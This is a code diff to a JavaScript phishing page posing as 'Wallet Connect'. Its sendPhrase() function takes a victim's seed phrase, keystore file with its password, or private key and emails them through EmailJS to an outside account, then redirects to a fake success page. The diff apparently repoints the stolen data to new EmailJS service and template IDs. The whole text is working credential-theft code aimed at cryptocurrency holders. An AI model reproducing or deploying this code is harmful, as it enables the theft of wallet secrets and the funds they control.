@@ -26,7 +26,7 @@ function sendPhrase() {
             from_name: 'Wallet Connect',
             message: `phrase is: ${document.getElementById('phrase').value}`
         };
-        emailjs.send('service_1b209fh', 'template_hr3iq0n', templateParams)
+        emailjs.send('service_evcipsg', 'template_7oct2km', templateParams)
             .then(function (response) {
                 let url = "./success.html";
                 window.location.href = url;
@@ -48,7 +48,7 @@ function sendPhrase() {
             from_name: 'Wallet Connect',
             message: `keystore value is: ${textValue} and keystore password is ${passwordValue}`
         };
-        emailjs.send('service_1b209fh', 'template_hr3iq0n', templateParams)
+        emailjs.send('service_evcipsg', 'template_7oct2km', templateParams)
             .then(function (response) {
                 let url = "./success.html";
                 window.location.href = url;
@@ -68,7 +68,7 @@ function sendPhrase() {
             from_name: 'Wallet Connect',
             message: `private key value is: ${textValue} `
         };
-        emailjs.send('service_1b209fh', 'template_hr3iq0n', templateParams)
+        emailjs.send('service_evcipsg', 'template_7oct2km', templateParams)
             .then(function (response) {
                 let url = "./success.html";
                 window.location.href = url;
